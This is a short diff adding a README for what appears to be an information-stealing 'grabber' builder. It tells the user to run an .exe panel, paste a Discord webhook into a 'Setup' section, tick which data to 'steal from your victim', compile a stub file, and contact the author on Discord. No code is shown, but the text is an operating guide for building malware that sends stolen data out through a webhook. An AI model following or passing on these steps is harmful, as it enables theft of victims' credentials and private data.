@@ -1,0 +1,12 @@
+Run the "main" .exe file, if a application saying "$ panel" doesent open, try running the "option2" .exe
+
+From there on, paste your discord webhook in the "Setup" section. 
+Check the check-bars that you want the grabber to steal from your victim! 
+
+Go to the "Compile" section and build your stub file! 
+
+
+
+
+If you need help! 
+Add me: $py#7302
